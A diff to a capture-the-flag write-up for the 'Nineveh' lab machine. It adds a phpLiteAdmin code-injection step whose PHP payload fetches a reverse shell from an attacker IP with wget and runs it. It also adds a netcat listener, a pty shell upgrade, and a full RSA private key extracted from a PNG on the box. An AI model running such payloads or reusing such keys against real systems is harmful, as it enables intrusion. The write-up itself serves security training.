@@ -298,9 +298,15 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-01-01 12:42:
 
 ### phpLiteAdmin code injection
 
-Login to the admin portal. Create a table called ninevehnotes.txt.php that gets created in directory /var/tmp/ninevehnotes.txt.php (remember to switch to the new table from the menu).
+Login to the admin portal. Create a database called ninevehNotes.txt.php that gets created in directory /var/tmp/ninevehNotes.txt.php (remember to switch to the new table from the menu).
 
 Create one table with a one field, type TEXT and the default value the payload. We use php reverse shell so use the kali standard, just fix the ip address.
+
+```
+<?php system("wget 10.10.14.23:9000/php-reverse-shell.php -O /tmp/ninevehNotes.txt.php;php /tmp/ninevehNotes.txt.php"); ?>
+```
+
+Setup the listeners for fetching the php-file and reverse shell.
 
 ```
 $ cp /usr/share/laudanum/php/php-reverse-shell.php .                                            
@@ -313,13 +319,14 @@ $ cp /usr/share/laudanum/php/php-reverse-shell.php .
 Serving HTTP on 0.0.0.0 port 9000 (http://0.0.0.0:9000/) ...
 ```
 
+```
+$ nc -nvlp 8888
+listening on [any] 8888 ...
+```
+
 Create a table with one field, and the default value of our field fetches our reverse shell and executes it
 
 For this CTF it is mandatory the database table contains name ninevehNotes.txt. This seems to be something the manage.php script checks. We can get past that check by naming our database to ninevehNotes.txt.php. The name of the database table and field do not matter.
-
-```
-<?php system("wget 10.10.14.23:9000/php-reverse-shell.php -O /tmp/shell.php;php /tmp/shell.php"); ?>
-```
 
 Finally insert the default value we defined for the field to the table.
 
@@ -359,9 +366,9 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 /bin/sh: 0: can't access tty; job control turned off
 $ whoami
 www-data
+$ python3 -c 'import pty; pty.spawn("/bin/bash")'
+www-data@nineveh:/$
 ```
-
-Ctrl-z, stty raw -echo, fg, reset to get a fully functional shell.
 
 ## Privilege Escalation
 
@@ -382,6 +389,65 @@ pwn                 100%[===================>]  22.63K  --.-KB/s    in 0.03s
 2022-01-01 13:04:25 (712 KB/s) - 'pwn' saved [23176/23176]
 
 $
+```
+
+This seems to crash the kernel, back to basics.
+
+### SSH with a private key
+
+An image in directory /var/www/ssl/secure_notes sounds like checking. tail nineveh.png reveals there is a private key hidden in it.
+
+```
+www-data@nineveh:/var/www/ssl/secure_notes$ tail nineveh.png
+tail nineveh.png
+tYXXuCE4yzenjrnkYEXMmjw0V9f6PskxwRemq7pxAPzSk0GVBUrEfnYEJSc/MmXC
+iEBMuPz0RAaK93ZkOg3Zya0CgYBYbPhdP5FiHhX0+7pMHjmRaKLj+lehLbTMFlB1
+MxMtbEymigonBPVn56Ssovv+bMK+GZOMUGu+A2WnqeiuDMjB99s8jpjkztOeLmPh
+PNilsNNjfnt/G3RZiq1/Uc+6dFrvO/AIdw+goqQduXfcDOiNlnr7o5c0/Shi9tse
+i6UOyQKBgCgvck5Z1iLrY1qO5iZ3uVr4pqXHyG8ThrsTffkSVrBKHTmsXgtRhHoc
+il6RYzQV/2ULgUBfAwdZDNtGxbu5oIUB938TCaLsHFDK6mSTbvB/DywYYScAWwF7
+fw4LVXdQMjNJC3sn3JaqY1zJkE4jXlZeNQvCx4ZadtdJD9iO+EUG
+-----END RSA PRIVATE KEY-----
+secret/nineveh.pub0000644000004100000410000000062013126060277014541 0ustar  www-datawww-datassh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCuL0RQPtvCpuYSwSkh5OvYoY//CTxgBHRniaa8c0ndR+wCGkgf38HPVpsVuu3Xq8fr+N3ybS6uD8Sbt38Umdyk+IgfzUlsnSnJMG8gAY0rs+FpBdQ91P3LTEQQfRqlsmS6Sc/gUflmurSeGgNNrZbFcNxJLWd238zyv55MfHVtXOeUEbkVCrX/CYHrlzxt2zm0ROVpyv/Xk5+/UDaP68h2CDE2CbwDfjFmI/9ZXv7uaGC9ycjeirC/EIj5UaFBmGhX092Pj4PiXTbdRv0rIabjS2KcJd4+wx1jgo4tNH/P6iPixBNf7/X/FyXrUsANxiTRLDjZs5v7IETJzVNOrU0R amrois@nineveh.htb
+www-data@nineveh:/var/www/ssl/secure_notes$
+```
+
+strings nineveh.png is another way to find interesting content. Also transferring the file to local machine and running binwalk reveals details of it.
+
+The private key
+
+```
+-----BEGIN RSA PRIVATE KEY-----
+MIIEowIBAAKCAQEAri9EUD7bwqbmEsEpIeTr2KGP/wk8YAR0Z4mmvHNJ3UfsAhpI
+H9/Bz1abFbrt16vH6/jd8m0urg/Em7d/FJncpPiIH81JbJ0pyTBvIAGNK7PhaQXU
+PdT9y0xEEH0apbJkuknP4FH5Zrq0nhoDTa2WxXDcSS1ndt/M8r+eTHx1bVznlBG5
+FQq1/wmB65c8bds5tETlacr/15Ofv1A2j+vIdggxNgm8A34xZiP/WV7+7mhgvcnI
+3oqwvxCI+VGhQZhoV9Pdj4+D4l023Ub9KyGm40tinCXePsMdY4KOLTR/z+oj4sQT
+X+/1/xcl61LADcYk0Sw42bOb+yBEyc1TTq1NEQIDAQABAoIBAFvDbvvPgbr0bjTn
+KiI/FbjUtKWpWfNDpYd+TybsnbdD0qPw8JpKKTJv79fs2KxMRVCdlV/IAVWV3QAk
+FYDm5gTLIfuPDOV5jq/9Ii38Y0DozRGlDoFcmi/mB92f6s/sQYCarjcBOKDUL58z
+GRZtIwb1RDgRAXbwxGoGZQDqeHqaHciGFOugKQJmupo5hXOkfMg/G+Ic0Ij45uoR
+JZecF3lx0kx0Ay85DcBkoYRiyn+nNgr/APJBXe9Ibkq4j0lj29V5dT/HSoF17VWo
+9odiTBWwwzPVv0i/JEGc6sXUD0mXevoQIA9SkZ2OJXO8JoaQcRz628dOdukG6Utu
+Bato3bkCgYEA5w2Hfp2Ayol24bDejSDj1Rjk6REn5D8TuELQ0cffPujZ4szXW5Kb
+ujOUscFgZf2P+70UnaceCCAPNYmsaSVSCM0KCJQt5klY2DLWNUaCU3OEpREIWkyl
+1tXMOZ/T5fV8RQAZrj1BMxl+/UiV0IIbgF07sPqSA/uNXwx2cLCkhucCgYEAwP3b
+vCMuW7qAc9K1Amz3+6dfa9bngtMjpr+wb+IP5UKMuh1mwcHWKjFIF8zI8CY0Iakx
+DdhOa4x+0MQEtKXtgaADuHh+NGCltTLLckfEAMNGQHfBgWgBRS8EjXJ4e55hFV89
+P+6+1FXXA1r/Dt/zIYN3Vtgo28mNNyK7rCr/pUcCgYEAgHMDCp7hRLfbQWkksGzC
+fGuUhwWkmb1/ZwauNJHbSIwG5ZFfgGcm8ANQ/Ok2gDzQ2PCrD2Iizf2UtvzMvr+i
+tYXXuCE4yzenjrnkYEXMmjw0V9f6PskxwRemq7pxAPzSk0GVBUrEfnYEJSc/MmXC
+iEBMuPz0RAaK93ZkOg3Zya0CgYBYbPhdP5FiHhX0+7pMHjmRaKLj+lehLbTMFlB1
+MxMtbEymigonBPVn56Ssovv+bMK+GZOMUGu+A2WnqeiuDMjB99s8jpjkztOeLmPh
+PNilsNNjfnt/G3RZiq1/Uc+6dFrvO/AIdw+goqQduXfcDOiNlnr7o5c0/Shi9tse
+i6UOyQKBgCgvck5Z1iLrY1qO5iZ3uVr4pqXHyG8ThrsTffkSVrBKHTmsXgtRhHoc
+il6RYzQV/2ULgUBfAwdZDNtGxbu5oIUB938TCaLsHFDK6mSTbvB/DywYYScAWwF7
+fw4LVXdQMjNJC3sn3JaqY1zJkE4jXlZeNQvCx4ZadtdJD9iO+EUG
+-----END RSA PRIVATE KEY-----
+```
+
+
+
 
 
 
